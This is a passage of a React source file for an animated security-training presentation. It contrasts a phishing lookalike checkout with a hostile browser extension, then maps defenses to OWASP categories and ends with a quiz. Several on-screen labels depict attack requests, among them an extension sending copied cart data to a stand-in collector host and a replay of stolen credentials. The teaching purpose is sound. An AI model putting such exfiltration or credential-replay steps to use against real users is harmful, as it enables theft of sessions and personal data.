              <span>{scene.visual === 'mfa' ? 'SECURITY CHECK' : 'SESSION EXPIRED'}</span><strong>{scene.visual === 'mfa' ? 'Enter the code we sent' : 'Sign in to continue'}</strong>
              <div className="auth-popup-fields">{scene.visual === 'mfa' ? <code>4 8 1 2 0 6</code> : <><i>maya@example.com</i><i>••••••••••••</i></>}</div><b>{scene.visual === 'mfa' ? 'VERIFY' : 'CONTINUE'} →</b>
            </div> : <div className="auth-transfer">
              <span>{scene.visual === 'cookie' ? 'RESPONSE RECEIVED' : scene.visual === 'blocked' ? 'READ ATTEMPT' : scene.visual === 'impact' ? 'AUTHENTICATED REQUEST' : 'SERVER RELAY'}</span>
              <code>{scene.visual === 'cookie' ? (model === 'bearer' ? 'Authorization token → attacker client' : 'Set-Cookie: __Host-session=eyJ…') : scene.visual === 'blocked' ? 'document.cookie  ✕  HttpOnly' : scene.visual === 'impact' ? 'Cookie: __Host-session=eyJ…  ✓' : 'POST shop.example/login'}</code>
              <strong>{scene.visual === 'blocked' ? 'VALUE HIDDEN' : scene.visual === 'impact' ? 'ACTING AS MAYA' : 'ATTACKER-CONTROLLED CLIENT'}</strong>
            </div>}
          </div>
          <div className="credential-story-copy"><span>{scene.actor}</span><strong className="story-title">{scene.title}</strong><p>{scene.body}</p></div>
        </div>
      </div>
      <div className="story-controls"><button type="button" onClick={() => setStep(current => current === 0 ? flow.scenes.length - 1 : current - 1)}>← Back</button><span className="story-play" aria-live="polite">Step {step + 1} / {flow.scenes.length}</span><button type="button" onClick={() => setStep(current => (current + 1) % flow.scenes.length)}>Next →</button></div>
      <div className="result-facts">{flow.facts.map(([icon, label, tone]) => <span className={`is-${tone}`} key={label}><b>{icon}</b>{label}</span>)}</div>
    </motion.div>
  );
}

function StorageTabs({ model, setModel, controls }) {
  return (
    <div className="credential-tabs" role="tablist" aria-label="Session storage model">
      {Object.entries(credentialModels).map(([key, value]) => <button type="button" role="tab" key={key} className={model === key ? 'is-selected' : ''} aria-selected={model === key} aria-controls={controls} onClick={() => setModel(key)}><span>{value.shortLabel}</span><small>{value.storage}</small></button>)}
    </div>
  );
}

function FullscreenCredentialFlow({ branch, model, setModel, reduceMotion, close }) {
  const closeRef = useRef(null);

  useEffect(() => {
    closeRef.current?.focus();
    function onKeyDown(event) {
      if (event.key === 'Escape') close();
    }
    window.addEventListener('keydown', onKeyDown);
    return () => window.removeEventListener('keydown', onKeyDown);
  }, [close]);

  return createPortal(
    <motion.div className="auth-flow-backdrop" role="presentation" onMouseDown={event => { if (event.target === event.currentTarget) close(); }}
      initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
      transition={{ duration: reduceMotion ? 0 : .15, ease: [.23, 1, .32, 1] }}>
      <motion.section className="auth-flow-dialog" role="dialog" aria-modal="true" aria-labelledby="auth-flow-title"
        initial={reduceMotion ? { opacity: 0 } : { opacity: 0, transform: 'translateY(12px)' }}
        animate={{ opacity: 1, transform: 'translateY(0px)' }}
        exit={reduceMotion ? { opacity: 0 } : { opacity: 0, transform: 'translateY(8px)' }}
        transition={{ duration: reduceMotion ? 0 : .24, ease: [.23, 1, .32, 1] }}>
        <div className="auth-flow-dialog-header">
          <div><span>ANIMATED SIGN-IN FORK</span><strong id="auth-flow-title">Who receives the authenticated session?</strong></div>
          <button ref={closeRef} type="button" onClick={close} aria-label="Close sign-in flow">Close ×</button>
        </div>
        <div className="auth-flow-dialog-switcher"><span>STORAGE AFTER LOGIN</span><StorageTabs model={model} setModel={setModel} controls="credential-flow-panel" /></div>
        <CredentialFlow branch={branch} model={model} reduceMotion={reduceMotion} />
      </motion.section>
    </motion.div>,
    document.body
  );
}

function SignInVisual({ branch, reduceMotion }) {
  const [model, setModel] = useState('cookie');
  const [open, setOpen] = useState(false);
  return (
    <div className="visual-stage signin-visual">
      <button id="credential-flow-launcher" className="signin-flow-launcher" type="button" onClick={() => setOpen(true)}>
        <span>ANIMATED USER FLOW · {credentialModels[model].shortLabel}</span>
        <strong>{branch === 'phishing' ? 'Watch the attacker relay sign-in, receive a new session, then impersonate Maya.' : 'Watch where local code can intercept—or ride—the stored session.'}</strong>
        <i>Open full-screen flow ↗</i>
      </button>
      <AnimatePresence>{open && <FullscreenCredentialFlow branch={branch} model={model} setModel={setModel} reduceMotion={reduceMotion} close={() => setOpen(false)} />}</AnimatePresence>
    </div>
  );
}

function ArrivalVisual({ branch, reduceMotion }) {
  const phishing = branch === 'phishing';
  return (
    <div className="visual-stage arrival-visual">
      <motion.div className="maya-thought" initial={reduceMotion ? false : { opacity: 0, transform: 'translateY(8px)' }} animate={{ opacity: 1, transform: 'translateY(0px)' }} transition={{ duration: .35, ease: [.23, 1, .32, 1] }}><span>MAYA SEES</span><strong>“The checkout I expected.”</strong></motion.div>
      <JourneyBrowser branch={branch} reduceMotion={reduceMotion} />
      <motion.div className={`origin-loupe ${phishing ? 'is-danger' : 'is-safe'}`} initial={reduceMotion ? false : { opacity: 0, transform: 'scale(.94)' }} animate={{ opacity: 1, transform: 'scale(1)' }} transition={{ duration: .4, delay: .24, ease: [.23, 1, .32, 1] }}>
        <span>BROWSER KNOWS</span><code>{phishing ? 'https://shop-example.help' : 'https://shop.example'}</code><strong>{phishing ? 'Valid TLS. Wrong identity.' : 'Right origin. Extension active.'}</strong>
      </motion.div>
    </div>
  );
}

function MutationVisual({ branch, reduceMotion }) {
  const phishing = branch === 'phishing';
  return (
    <div className="visual-stage mutation-visual">
      <BrowserWindow branch={branch} inspector />
      <div className="wiring-panel">
        <span>{phishing ? 'BUTTON WIRING' : 'LOCAL MUTATION'}</span>
        {phishing ? <div className="handler-chain"><motion.b initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: .08 }}>Pay click</motion.b><i>→</i><motion.b initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: .2 }}>preventDefault()</motion.b><i>→</i><motion.b className="is-danger" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: .32 }}>POST /collect</motion.b></div> : <div className="dom-diff"><code><del>delivery.account = "maya@home"</del><ins>delivery.account = "drop_772"</ins></code><motion.i initial={reduceMotion ? false : { transform: 'scaleX(0)' }} animate={{ transform: 'scaleX(1)' }} transition={{ duration: .45, delay: .22, ease: [.23, 1, .32, 1] }} /></div>}
        <p>{phishing ? 'The familiar label hides an attacker-owned submit target.' : 'The extension never reads the HttpOnly cookie. It changes a value the page will serialize.'}</p>
      </div>
    </div>
  );
}

function ClickVisual({ branch, reduceMotion }) {
  const [run, setRun] = useState(1);
  return (
    <div className="visual-stage click-visual">
      <div className="click-browser-wrap">
        <BrowserWindow branch={branch} interactive onPay={() => setRun(value => value + 1)} playKey={run} />
        {!reduceMotion && <motion.div key={`cursor-${run}`} className="visual-cursor" initial={{ opacity: 0, transform: 'translate(90px, 54px)' }} animate={{ opacity: [0, 1, 1, 0], transform: ['translate(90px, 54px)', 'translate(0px, 0px)', 'translate(0px, 0px)', 'translate(0px, 0px)'] }} transition={{ duration: 1.05, ease: 'easeInOut' }}>↖</motion.div>}
      </div>
      <div className="click-route"><RequestMap branch={branch} run={run} reduceMotion={reduceMotion} /><button type="button" onClick={() => setRun(value => value + 1)}>Replay Maya’s click ↻</button></div>
    </div>
  );
}

function RequestJourneyVisual({ branch, reduceMotion }) {
  const requestOptions = branch === 'phishing'
    ? {
        collector: { label: '1 · Collector', method: 'POST shop-example.help/collect', origin: 'Origin: https://shop-example.help', credential: 'Cookie[shop.example]: not attached', intent: 'Maya voluntarily submitted fields', authority: 'Attacker stores password, OTP, checkout data', outcome: 'CAPTURED · browser controls intact' },
        replay: { label: '2 · Replay', method: 'POST shop.example/session', origin: 'Server-to-server · no browser Origin', credential: 'email + password + live OTP', intent: 'Stolen proof; not Maya’s current intent', authority: 'Shop may mint session=s_attacker', outcome: 'NEW SESSION · not Maya’s cookie' }
      }
    : {
        shop: { label: 'A · Shop request', method: 'POST shop.example/api/checkout', origin: 'Origin: https://shop.example', credential: 'Cookie: __Host-session=s_7f2a', intent: 'X-CSRF-Token: valid', authority: 'deliveryAccountId=drop_772 ← client', outcome: 'AUTH ✓ · CSRF ✓ · OWNERSHIP ✕' },
        exfil: { label: 'B · Exfil request', method: 'POST collector.invalid/events', origin: 'Origin: chrome-extension://…', credential: 'Shop cookie: absent and unnecessary', intent: 'runtime message → MV3 service worker', authority: 'DOM-visible cart + recipient copied', outcome: 'HOST PERMISSION → COLLECTOR 200' }
      };
  const [selected, setSelected] = useState(Object.keys(requestOptions)[0]);
  const [run, setRun] = useState(1);
  const packet = requestOptions[selected] || Object.values(requestOptions)[0];
  return (
    <div className="visual-stage journey-map-visual">
      <RequestMap branch={branch} phase={branch === 'phishing' && selected === 'collector' ? 'click' : 'relay'} run={run} reduceMotion={reduceMotion} />
      <div className="packet-inspector">
        <span>OPEN THE REQUEST</span>
        <div className="request-tabs" role="group" aria-label="Inspect each request">{Object.entries(requestOptions).map(([key, value]) => <button type="button" key={key} className={selected === key ? 'is-selected' : ''} aria-pressed={selected === key} onClick={() => setSelected(key)}>{value.label}</button>)}</div>
        <AnimatePresence mode="wait" initial={false}><motion.div className="request-envelope" key={selected} initial={reduceMotion ? false : { opacity: 0, transform: 'translateX(6px)' }} animate={{ opacity: 1, transform: 'translateX(0px)' }} exit={{ opacity: 0 }} transition={{ duration: .2 }}>
          <code><b>request</b>{packet.method}</code><code><b>context</b>{packet.origin}</code><code><b>credential</b>{packet.credential}</code><code><b>intent</b>{packet.intent}</code><code className="is-danger"><b>authority</b>{packet.authority}</code><strong>{packet.outcome}</strong>
        </motion.div></AnimatePresence>
      </div>
      <button className="diagram-replay" type="button" onClick={() => setRun(value => value + 1)}>Replay packets ↻</button>
    </div>
  );
}

const capabilityModes = {
  phishing: {
    label: 'Phishing', hint: 'wrong site', icon: '◇', context: 'On an attacker-owned website',
    power: 'Maya can hand over secrets and form data.',
    crossed: 'Human destination checking',
    standing: 'The browser still isolates the real shop session.',
    request: 'POST shop-example.help/collect/login',
    detail: 'The collector receives only what Maya submits. A separate replay may create a new attacker session; Maya’s original HttpOnly cookie is not stolen.'
  },
  csrf: {
    label: 'CSRF', hint: 'borrowed session', icon: '↪', context: 'On another site, sending toward the shop',
    power: 'The browser may attach Maya’s session for one action.',
    crossed: 'Proof that Maya intended this request',
    standing: 'The attacker still cannot read the shop page or response.',
    request: 'POST shop.example/api/checkout',
    detail: 'SameSite can block the cross-site POST. Origin, CSRF-token, and Fetch Metadata checks let the server verify intent; SOP/CORS alone do not prevent every request.'
  },
  xss: {
    label: 'XSS', hint: 'inside the site', icon: '</>', context: 'Inside the shop’s page',
    power: 'Hostile code can act and read as the trusted page.',
    crossed: 'The shop page’s code integrity',
    standing: 'HttpOnly still hides the cookie value itself.',
    request: "fetch('/api/checkout')",
    detail: 'Same-origin script can read the DOM, CSRF tokens, and responses, then issue authenticated actions. Encoding, sanitization, CSP, and Trusted Types reduce its reach.'
  },
  extension: {
    label: 'Extension', hint: 'beside the site', icon: '◈', context: 'Beside the page, with granted access',
    power: 'It can alter the DOM and send a separate copy out.',
    crossed: 'The assumption that the client UI is honest',
    standing: 'The cookie stays unreadable without extra permission.',
    request: 'shop checkout + extension collector fetch',
    detail: 'The shop request can pass authentication and CSRF while still failing recipient authorization. Direct cookie access needs the cookies permission plus matching host access.'
  }
};

function PrivilegeGapVisual({ branch, reduceMotion }) {
  const [mode, setMode] = useState(branch);
  const [showProof, setShowProof] = useState(false);
  const item = capabilityModes[mode];
  const tone = mode === 'extension' ? 'extension' : 'attack';
  return (
    <div className="visual-stage privilege-visual">
      <div className="capability-intro">
        <span>THE THREE-QUESTION TEST</span>
        <strong>Follow the power, not the acronym.</strong>
        <small>Choose a mechanism, then read left to right.</small>
      </div>
      <div className="capability-tabs" role="group" aria-label="Compare attack capabilities">
        {Object.entries(capabilityModes).map(([key, value]) => <button type="button" key={key} className={`${mode === key ? 'is-selected' : ''} mode-${key}`} aria-pressed={mode === key} onClick={() => { setMode(key); setShowProof(false); }}><i aria-hidden="true">{value.icon}</i><span>{value.label}</span><small>{value.hint}</small></button>)}
      </div>
      <AnimatePresence mode="wait" initial={false}><motion.div className={`capability-body tone-${tone}`} key={mode} initial={reduceMotion ? false : { opacity: 0, transform: 'translateY(7px)' }} animate={{ opacity: 1, transform: 'translateY(0px)' }} exit={{ opacity: 0 }} transition={{ duration: .24 }}>
        <div className="power-trail">
          <div><span>01 · WHERE?</span><strong>{item.context}</strong></div><i aria-hidden="true">→</i>
          <div><span>02 · WHAT POWER?</span><strong>{item.power}</strong></div><i aria-hidden="true">→</i>
          <div className="is-break"><span>03 · WHAT BREAKS?</span><strong>{item.crossed}</strong></div>
          <motion.span className="power-packet" initial={reduceMotion ? false : { transform: 'scaleX(0)', opacity: 0 }} animate={{ transform: 'scaleX(1)', opacity: [0, 1, .2] }} transition={{ duration: reduceMotion ? 0 : 1.15, ease: [.77, 0, .175, 1] }} />
        </div>
        <div className="standing-card">
          <span><i aria-hidden="true">✓</i> STILL STANDING</span>
          <strong>{item.standing}</strong>
        </div>
        <button className="proof-toggle" type="button" aria-expanded={showProof} onClick={() => setShowProof(value => !value)}>{showProof ? 'Hide' : 'Show'} technical proof <span aria-hidden="true">{showProof ? '−' : '+'}</span></button>
        <AnimatePresence initial={false}>{showProof && <motion.div className="mechanism-proof" initial={reduceMotion ? false : { opacity: 0, transform: 'translateY(-5px)' }} animate={{ opacity: 1, transform: 'translateY(0)' }} exit={{ opacity: 0 }} transition={{ duration: .18, ease: [.23, 1, .32, 1] }}><div><span>CANONICAL ACTION</span><code>{item.request}</code></div><p>{item.detail}</p></motion.div>}</AnimatePresence>
      </motion.div></AnimatePresence>
    </div>
  );
}

function ReceiptsVisual({ branch, reduceMotion }) {
  const phishing = branch === 'phishing';
  return (
    <div className="visual-stage receipts-visual">
      <div className="receipt-column"><span>MAYA’S SCREEN</span><BrowserWindow branch={branch} view="receipt" /></div>
      <motion.div className="receipt-divider" initial={reduceMotion ? false : { transform: 'scaleY(0)' }} animate={{ transform: 'scaleY(1)' }} transition={{ duration: .5, ease: [.23, 1, .32, 1] }}><span>SAME MOMENT</span></motion.div>
      <div className="receipt-column attacker-receipt"><span>ATTACKER’S SCREEN</span><motion.div className="attacker-dashboard" initial={reduceMotion ? false : { opacity: 0, transform: 'translateY(10px)' }} animate={{ opacity: 1, transform: 'translateY(0px)' }} transition={{ duration: .4, delay: .18, ease: [.23, 1, .32, 1] }}><div><i>●</i><span>LIVE EVENTS</span><strong>09:41:00.214</strong></div><b>{phishing ? 'capture_7F2A' : 'order ord_8821'}</b><h3>{phishing ? 'Credentials captured' : 'Delivery redirected'}</h3><p>{phishing ? 'Form data stored · victim shown local success' : 'delivery.account → drop_772'}</p><code>{phishing ? 'collector / 200 OK' : 'shop response / 200 OK'}</code></motion.div></div>
    </div>
  );
}

function RewindVisual({ branch, reduceMotion }) {
  const controls = branch === 'phishing'
    ? [['01', 'Origin-bound autofill', 'The lookalike stays empty.'], ['02', 'Passkey origin check', 'The relay cannot authenticate.'], ['03', 'Verified shop receipt', 'Fake success has no order ID.']]
    : [['01', 'Narrow site access', 'The script stays dormant.'], ['02', 'Server-owned recipient', 'DOM edits lose authority.'], ['03', 'Step-up confirmation', 'Sensitive changes need fresh intent.']];
  return (
    <div className="visual-stage rewind-visual">
      <svg viewBox="0 0 1000 180" aria-hidden="true"><path className="rewind-base" d="M80 90 H920" /><motion.path className="rewind-active" d="M80 90 H920" initial={{ pathLength: reduceMotion ? 1 : 0 }} animate={{ pathLength: 1 }} transition={{ duration: reduceMotion ? 0 : .68, ease: 'easeInOut' }} />{[220,500,780].map((x, index) => <motion.g key={x} initial={reduceMotion ? false : { opacity: 0, transform: `translate(${x}px, 90px) scale(.8)` }} animate={{ opacity: 1, transform: `translate(${x}px, 90px) scale(1)` }} transition={{ duration: .32, delay: reduceMotion ? 0 : .18 + index * .08, ease: [.23, 1, .32, 1] }}><circle r="27" /><path d="M0 -11 L12 -5 V5 C12 13 5 18 0 21 C-5 18 -12 13 -12 5 V-5 Z" /><text y="4" textAnchor="middle">{index + 1}</text></motion.g>)}</svg>
      <div className="control-cards">{controls.map(([number, title, body], index) => <motion.div key={number} initial={reduceMotion ? false : { opacity: 0, transform: 'translateY(8px)' }} animate={{ opacity: 1, transform: 'translateY(0px)' }} transition={{ duration: .32, delay: reduceMotion ? 0 : .2 + index * .06, ease: [.23, 1, .32, 1] }}><span>{number}</span><strong>{title}</strong><p>{body}</p></motion.div>)}</div>
      <div className="rewind-result"><span>ATTACK CHAIN</span><strong>Broken before the payment request.</strong></div>
    </div>
  );
}

const journeyVisuals = {
  'The setup': SetupVisual,
  'The sign-in': SignInVisual,
  'The arrival': ArrivalVisual,
  'The invisible edit': MutationVisual,
  'The click': ClickVisual,
  'Under the hood': RequestJourneyVisual,
  'The privilege gap': PrivilegeGapVisual,
  'The two receipts': ReceiptsVisual,
  'The rewind': RewindVisual
};

function JourneyScene({ scene, branch, setBranch }) {
  const reduceMotion = useReducedMotion();
  const story = scene[branch];
  const path = compromisePaths[branch];
  const SceneVisual = journeyVisuals[scene.label];

  return (
    <section className={`scene-shell journey-scene branch-${branch}`} aria-labelledby={`journey-${scene.progress}-${scene.label.replaceAll(' ', '-')}`}>
      <div className="journey-heading">
        <div>
          <div className="scene-index"><span>Journey · {scene.label}</span><strong>{scene.time}</strong></div>
          <h2 id={`journey-${scene.progress}-${scene.label.replaceAll(' ', '-')}`}>{scene.title}</h2>
          <p>{scene.thesis}</p>
        </div>
        <PathSwitch branch={branch} setBranch={setBranch} compact />
      </div>

      <CausalThread path={path} progress={scene.progress} reduceMotion={reduceMotion} />
      <AnimatePresence mode="wait" initial={false}>
        <motion.div className="scene-visual-wrap" key={`${branch}-${scene.label}`}
          initial={reduceMotion ? false : { opacity: 0, transform: 'translateX(12px)' }} animate={{ opacity: 1, transform: 'translateX(0px)' }} exit={reduceMotion ? { opacity: 0 } : { opacity: 0, transform: 'translateX(-8px)' }} transition={{ duration: .32, ease: [.23, 1, .32, 1] }}>
          <SceneVisual branch={branch} story={story} reduceMotion={reduceMotion} />
          {!['The sign-in', 'The privilege gap'].includes(scene.label) && <VisualEvidence items={story.evidence} reduceMotion={reduceMotion} />}
        </motion.div>
      </AnimatePresence>
    </section>
  );
}

function ReflectionBridge({ branch, next }) {
  const path = compromisePaths[branch];
  return (
    <section className="scene-shell reflection-bridge" aria-labelledby="reflection-title">
      <div className="bridge-copy">
        <div className="scene-index"><span>Journey complete</span><strong>{path.label}</strong></div>
        <p className="scene-kicker">Review the request</p>
        <h2 id="reflection-title">Check each system boundary.</h2>
        <p className="scene-thesis">You saw how one request caused harm. Now follow the request through eight boundaries. At each boundary, identify the claim, the attack, and the control.</p>
        <button className="primary-action" type="button" onClick={next}>Start the review <span aria-hidden="true">→</span></button>
      </div>
      <div className="bridge-map" role="img" aria-label="Moving from the concrete incident to reusable security questions">
        <div><span>INCIDENT</span><strong>{branch === 'phishing' ? 'Maya used a checkout page on the wrong origin.' : 'A hostile browser extension changed data on the correct site.'}</strong></div>
        <i>→</i>
        <div><span>CHECK</span><strong>Which claim crosses the boundary? Which component verifies it?</strong></div>
        <i>→</i>
        <div><span>RESULT</span><strong>A repeatable review method for sensitive requests</strong></div>
      </div>
    </section>
  );
}

function Checkpoint({ scene, phase, setPhase }) {
  return (
    <section className={`scene-shell checkpoint-scene checkpoint-${scene.zone}`} aria-labelledby={`scene-${scene.zone}-title`}>
      <div className="story-column">
        <div className="scene-index"><span>{scene.label}</span><strong>t = {scene.time}</strong></div>
        <LensBadges lenses={scene.lenses} />
        <h2 id={`scene-${scene.zone}-title`}>{scene.title}</h2>
        <p className="scene-thesis">{scene.thesis}</p>
        <div className="audience-prompt"><span>ASK THE AUDIENCE</span><p>{scene.prompt}</p></div>
        <p className="method-line"><span>Find claim</span><i>→</i><span>Show attack</span><i>→</i><span>Add control</span></p>
      </div>
      <RequestLab scene={scene} phase={phase} setPhase={setPhase} />
    </section>
  );
}

function FieldTest() {
  const [index, setIndex] = useState(0);
  const [answer, setAnswer] = useState(null);
  const [score, setScore] = useState(0);
  const item = quiz[index];

  function choose(choiceIndex) {
    if (answer !== null) return;
    setAnswer(choiceIndex);
    if (choiceIndex === item.right) setScore(value => value + 1);
  }

  function nextQuestion() {
    if (index < quiz.length - 1) {
      setIndex(value => value + 1);
      setAnswer(null);
    }
  }

  return (
    <section className="scene-shell field-scene" aria-labelledby="field-title">
      <div className="story-column">
        <div className="scene-index"><span>Field test</span><strong>replay · 03 signals</strong></div>
        <p className="scene-kicker">Apply the method</p>
        <h2 id="field-title">Identify the failed check.</h2>
        <p className="scene-thesis">First, find the system boundary. Then select the control that verifies the claim.</p>
        <div className="field-score"><span>SECURITY SCORE</span><strong>{score} / {quiz.length}</strong></div>
      </div>
      <div className="quiz-card">
        <div className="quiz-meta"><span>SIGNAL {String(index + 1).padStart(2, '0')} / 03</span><strong>req_7F2A · REPLAY</strong></div>
        <h3>{item.question}</h3>
        <div className="quiz-choices">
          {item.choices.map((choice, choiceIndex) => (
            <button type="button" key={choice} onClick={() => choose(choiceIndex)} disabled={answer !== null}
              className={answer === choiceIndex ? (choiceIndex === item.right ? 'is-correct' : 'is-wrong') : answer !== null && choiceIndex === item.right ? 'is-correct' : ''}>
              <span>{String.fromCharCode(65 + choiceIndex)}</span>{choice}
            </button>
          ))}
        </div>
        <div className={`quiz-feedback ${answer !== null ? 'is-visible' : ''}`} aria-live="polite">
          <p>{answer === null ? 'Ask the audience to vote. Then show the control.' : item.why}</p>
          {answer !== null && index < quiz.length - 1 && <button type="button" onClick={nextQuestion}>Next signal →</button>}
          {answer !== null && index === quiz.length - 1 && <strong>Trace complete.</strong>}
        </div>
      </div>
    </section>
  );
}

function Closing({ restart, openLens }) {
  const questions = [
    ['01', 'Who sent the claim?', 'Verify the identity and origin.'],
    ['02', 'Can this user do this action?', 'Authorize the action and object for every request.'],
    ['03', 'Can input change the program?', 'Keep untrusted values separate from program structure.'],
    ['04', 'Which system owns this value?', 'Calculate price, state, and sequence on the server.'],
    ['05', 'What must happen after a failure?', 'Use a safe state. Record a request ID and useful logs.']
  ];
  return (
    <section className="scene-shell closing-scene" aria-labelledby="closing-title">
      <div className="story-column">
        <div className="scene-index"><span>Case closed</span><strong>req_7F2A · 214 ms</strong></div>
        <p className="scene-kicker">Request review</p>
        <h2 id="closing-title">Verify each claim at its boundary.</h2>
        <p className="scene-thesis">OWASP lists common security failures. Use these five questions to find the required checks in your system.</p>
        <div className="closing-actions"><button className="primary-action" type="button" onClick={restart}>Replay the request</button><button className="secondary-action" type="button" onClick={openLens}>Open OWASP reference</button></div>
      </div>
      <div className="question-stack" role="group" aria-label="Five questions to apply to every sensitive request">
        {questions.map(([number, title, body]) => <div key={number}><span>{number}</span><strong>{title}</strong><small>{body}</small></div>)}
        <p><span>THIS WEEK</span> Select one production request. Draw each handoff. Write the required verification at each boundary.</p>
      </div>
    </section>
  );
}

function SceneBrowser({ open, currentIndex, onClose, onSelect }) {
  const reduceMotion = useReducedMotion();
  const railRef = useRef(null);
  const [cursor, setCursor] = useState(currentIndex);

  useEffect(() => {
    if (!open) return;
    setCursor(currentIndex);
  }, [open, currentIndex]);

  useEffect(() => {
    if (!open) return;
    railRef.current?.querySelector(`[data-scene-index="${cursor}"]`)?.scrollIntoView({
      behavior: reduceMotion ? 'auto' : 'smooth',
      block: 'nearest',
      inline: 'center'
    });
  }, [cursor, open, reduceMotion]);

  useEffect(() => {
    if (!open) return undefined;
    const closeOnEscape = event => {
      if (event.key === 'Escape') onClose();
    };
    document.addEventListener('keydown', closeOnEscape);
    return () => document.removeEventListener('keydown', closeOnEscape);
  }, [open, onClose]);

  return (
    <AnimatePresence>
      {open && (
        <motion.aside className="scene-browser" aria-label="Scene browser"
          initial={reduceMotion ? false : { opacity: 0, transform: 'translateY(18px) scale(.985)' }}
          animate={{ opacity: 1, transform: 'translateY(0px) scale(1)' }}
          exit={{ opacity: 0, transform: 'translateY(12px) scale(.99)' }}
          transition={{ type: 'spring', visualDuration: .32, bounce: .08 }}>
          <div className="scene-browser-heading">
            <div><span>SCENE MAP · {String(cursor + 1).padStart(2, '0')} / {String(scenes.length).padStart(2, '0')}</span><strong>{scenes[cursor].label}</strong></div>
            <button type="button" onClick={onClose} aria-label="Close scene browser">×</button>
          </div>
          <div className="scene-carousel" ref={railRef} role="listbox" aria-label="Choose a presentation scene">
            {scenes.map((item, index) => {
              const selected = cursor === index;
              const section = item.section ?? (index < reflectionStartIndex ? 'journey' : 'reflections');
              return (
                <motion.button type="button" role="option" aria-selected={selected} data-scene-index={index}
                  className={`scene-card ${selected ? 'is-selected' : ''} ${currentIndex === index ? 'is-current' : ''}`}
                  onClick={() => setCursor(index)} key={`${item.label}-card`}
                  animate={selected && !reduceMotion ? { transform: 'translateY(-5px)' } : { transform: 'translateY(0px)' }}
                  transition={{ type: 'spring', visualDuration: .28, bounce: .12 }}>
                  <span>{section} · {String(index + 1).padStart(2, '0')}</span>
                  <strong>{item.label}</strong>
                  <small>{item.time} · {item.minutes} min</small>
                  {currentIndex === index && <i>ON STAGE</i>}
                </motion.button>
              );
            })}
          </div>
          <div className="scene-carousel-controls">
            <button type="button" onClick={() => setCursor(value => Math.max(0, value - 1))} disabled={cursor === 0} aria-label="Previous scene preview">←</button>
            <div aria-hidden="true">{scenes.map((_, index) => <i key={index} className={index === cursor ? 'is-active' : ''} />)}</div>
            <button type="button" onClick={() => setCursor(value => Math.min(scenes.length - 1, value + 1))} disabled={cursor === scenes.length - 1} aria-label="Next scene preview">→</button>
            <button className="scene-open-button" type="button" onClick={() => onSelect(cursor)}>Open scene <span>↗</span></button>
          </div>
        </motion.aside>
      )}
    </AnimatePresence>
  );
}

function LensDialog({ dialogRef }) {
  return (
    <dialog className="lens-dialog" ref={dialogRef} aria-labelledby="lens-title">
      <div className="dialog-heading"><div><span>REFERENCE</span><h2 id="lens-title">OWASP Top 10:2025</h2></div><button type="button" aria-label="Close OWASP reference" onClick={() => dialogRef.current?.close()}>×</button></div>
      <p>Use OWASP categories to classify common failures. One boundary can have multiple categories. One category can apply to multiple boundaries.</p>
      <div className="lens-grid">
        {Object.entries(owasp).map(([code, [name, href]]) => <a href={href} target="_blank" rel="noreferrer" key={code}><b>{code}</b><span>{name}</span><i>↗</i></a>)}
      </div>
      <div className="dialog-note"><strong>A03 applies before the request starts.</strong><span>Software supply chain controls determine which software processes req_7F2A. This presentation does not show that part of the system.</span></div>
    </dialog>
  );
}

export default function App() {
  const reduceMotion = useReducedMotion();
  const stageRef = useRef(null);
  const lensRef = useRef(null);
  const [sceneIndex, setSceneIndex] = useState(() => {
    const match = window.location.hash.match(/scene-(\d+)/);
    return Math.min(Math.max(Number(match?.[1] ?? 0), 0), scenes.length - 1);
  });
  const [phase, setPhase] = useState(0);
  const [branch, setBranch] = useState('phishing');
  const [showNotes, setShowNotes] = useState(false);
  const [highContrast, setHighContrast] = useState(false);
  const [timerRunning, setTimerRunning] = useState(false);
  const [elapsed, setElapsed] = useState(0);
  const [inputMode, setInputMode] = useState('pointer');
  const [direction, setDirection] = useState(1);
  const [sceneBrowserOpen, setSceneBrowserOpen] = useState(false);
  const scene = scenes[sceneIndex];
  const currentSection = scene.section ?? (sceneIndex < reflectionStartIndex ? 'journey' : 'reflections');

  const totalMinutes = useMemo(() => scenes.reduce((sum, item) => sum + item.minutes, 0), []);

  useEffect(() => {
    document.body.dataset.input = inputMode;
    document.body.classList.toggle('high-contrast', highContrast);
  }, [inputMode, highContrast]);

  useEffect(() => {
    if (!timerRunning) return undefined;
    const timer = window.setInterval(() => setElapsed(value => value + 1), 1000);
    return () => window.clearInterval(timer);
  }, [timerRunning]);

  useEffect(() => {
    const onHash = () => {
      const match = window.location.hash.match(/scene-(\d+)/);
      const next = Math.min(Math.max(Number(match?.[1] ?? 0), 0), scenes.length - 1);
      setDirection(next >= sceneIndex ? 1 : -1);
      setSceneIndex(next);
      setPhase(0);
      setSceneBrowserOpen(false);
    };
    window.addEventListener('hashchange', onHash);
    return () => window.removeEventListener('hashchange', onHash);
  }, [sceneIndex]);

  function goTo(index, mode = 'pointer') {
    const next = Math.min(Math.max(index, 0), scenes.length - 1);
    setInputMode(mode);
    setDirection(next >= sceneIndex ? 1 : -1);
    setSceneIndex(next);
    setPhase(0);
    setSceneBrowserOpen(false);
    window.history.replaceState(null, '', `#scene-${next}`);
    stageRef.current?.scrollTo({ top: 0, behavior: 'auto' });
  }

  useEffect(() => {
    function onKeyDown(event) {
      if (document.querySelector('dialog[open], [role="dialog"][aria-modal="true"]') || sceneBrowserOpen) return;
      if (['INPUT', 'TEXTAREA', 'BUTTON', 'A'].includes(document.activeElement?.tagName)) return;
      if (event.key === 'ArrowRight' || event.key === 'PageDown') { event.preventDefault(); goTo(sceneIndex + 1, 'keyboard'); }
      if (event.key === 'ArrowLeft' || event.key === 'PageUp') { event.preventDefault(); goTo(sceneIndex - 1, 'keyboard'); }
      if (event.key === ' ') {
        event.preventDefault();
        if (scene.type === 'checkpoint' && phase < 2) { setInputMode('keyboard'); setPhase(value => value + 1); }
        else goTo(sceneIndex + 1, 'keyboard');
      }
      if (['1', '2', '3'].includes(event.key) && scene.type === 'checkpoint') { setInputMode('keyboard'); setPhase(Number(event.key) - 1); }
      if (event.key.toLowerCase() === 'n') setShowNotes(value => !value);
      if (event.key.toLowerCase() === 'o') lensRef.current?.showModal();
      if (event.key === 'Home') goTo(0, 'keyboard');
      if (event.key === 'End') goTo(scenes.length - 1, 'keyboard');
    }
    document.addEventListener('keydown', onKeyDown);
    return () => document.removeEventListener('keydown', onKeyDown);
